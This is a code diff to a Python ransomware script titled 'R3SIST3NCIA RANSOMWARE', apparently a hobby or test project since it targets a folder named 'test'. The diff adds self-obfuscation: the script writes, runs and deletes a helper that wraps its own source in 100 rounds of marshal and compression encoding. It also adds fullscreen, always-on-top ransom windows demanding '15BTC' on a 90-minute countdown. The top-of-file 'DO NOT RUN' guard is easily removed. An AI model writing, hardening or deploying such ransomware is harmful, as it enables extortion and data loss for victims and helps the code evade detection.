@@ -1,10 +1,11 @@
+# DONT RUN
+print('DO NOT RUN THIS SCRIPT')
+quit()
+
+import base64
+import os
 import pathlib
 import secrets
-import os
-import base64
-import getpass
-import time
-from pathlib import Path
 import tkinter as tk
 
 import cryptography
@@ -115,11 +116,16 @@ def decrypt_files():
     decrypt_folder('test', generate_key('1234', load_existing_salt=True))
     root.destroy()
 
+    # Paid window
     good = tk.Tk()
     good.title('Good for you')
-    good.geometry('300x50')
+    good.geometry(f'{good.winfo_screenwidth()}x{good.winfo_screenheight()}')
     good.resizable(False, False)
-    tk.Label(good, text='Your files have been decrypted... yay.', font=('calibri', 12, 'bold')).pack()
+    good.overrideredirect(True)
+    good.attributes('-topmost', True)
+    good.configure(background='black')
+    tk.Label(good, text=res, font=('consolas', 30), fg='green', bg='black').pack()
+    tk.Label(good, text='Your files have been decrypted... yay.', font=('calibri', 30, 'bold'), fg='green', bg='black').pack()
     good.after(5000, good.destroy)
     good.mainloop()
 
@@ -128,31 +134,65 @@ def decrypt_files():
 
 encrypt_files()
 
+FUSCATE_DIR = os.path.dirname(os.path.realpath(__file__)) + "\\oops.py"
+FUSCATE = """import sys,argparse,random,marshal,lzma,gzip,bz2,binascii,zlib
+def encode(source:str) -> str:
+    selected_mode = random.choice((lzma, gzip, bz2, binascii, zlib))
+    marshal_encoded = marshal.dumps(compile(source, 'Py-Fuscate', 'exec'))
+    if selected_mode is binascii:
+        return 'import marshal,lzma,gzip,bz2,binascii,zlib;exec(marshal.loads(binascii.a2b_base64({})))'.format(binascii.b2a_base64(marshal_encoded))
+    return 'import marshal,lzma,gzip,bz2,binascii,zlib;exec(marshal.loads({}.decompress({})))'.format(selected_mode.__name__, selected_mode.compress(marshal_encoded))
+if __name__ == '__main__':
+    with open('ransomware-test.py') as inp:
+        for i in range(100):
+            if i == 0:
+                encoded = encode(source=inp.read())
+            else:
+                encoded = encode(source=encoded)
+    with open('ransomware-test.py', 'w') as output:
+        output.write(encoded)"""
+
+with open(FUSCATE_DIR, "w") as f:
+    f.write(FUSCATE)
+
+os.system('python.exe ' + FUSCATE_DIR)
+os.remove(FUSCATE_DIR)
+
 res = """
   ___ _______ ___ ___ _____ _____  _  ___ ___   _   
  | _ |__ / __|_ _/ __|_   _|__ | \| |/ __|_ _| /_\  
  |   /|_ \__ \| |\__ \ | |  |_ | .` | (__ | | / _ \ 
   |_|_|___|___|___|___/ |_| |___|_|\_|\___|___/_/ \_\ """
 
+def nothing():
+    pass
+
+# Main ransomware window
 root = tk.Tk()
-root.title('R3SIST3NCIA RANSOMWARE')
-root.geometry('500x300')
+root.title('WE GOT YOU LOL')
+root.geometry('1000x500')
 root.resizable(False, False)
+root.overrideredirect(True)
+root.attributes('-topmost',True)
 tk.Label(root, text=res, font=('consolas', 12)).pack()
 tk.Label(root, text="Your files have been encrypted :D",  font=('calibri', 12,'bold')).pack()
+tk.Label(root, text="Pay 15BTC or LOSE EVERYTHING",  font=('calibri', 14,'bold'), fg='red').pack()
 label = tk.Label(root, font=('calibri', 50, 'bold'), fg='black', bg='red')
 label.pack()
-w = tk.Button(root, text='Decrypt Files', command=decrypt_files)
-w.pack(side='bottom')
+tk.Button(root, text='PAY', command=decrypt_files, bg='green', fg='white', height='5', width='10', font=('calibri', 20,'bold')).pack(side='bottom')
 
-countdown('00:00:01')
+countdown('01:30:00')
 root.mainloop()
 
-
+# Didn't pay window
 bye = tk.Tk()
 bye.title('HAHAHA')
-bye.geometry('300x50')
+bye.geometry(f'{bye.winfo_screenwidth()}x{bye.winfo_screenheight()}')
 bye.resizable(False, False)
-tk.Label(bye, text='Your files are lost forever... :D byeee', font=('calibri', 12,'bold')).pack()
+bye.overrideredirect(True)
+bye.attributes('-topmost',True)
+bye.configure(background='black')
+tk.Label(bye, text=res, font=('consolas', 30), fg='red', bg='black').pack()
+tk.Label(bye, text='Your files are lost forever... :D byeee', font=('calibri', 30,'bold'), fg='red', bg='black').pack()
 bye.after(5000, bye.destroy)
 bye.mainloop()
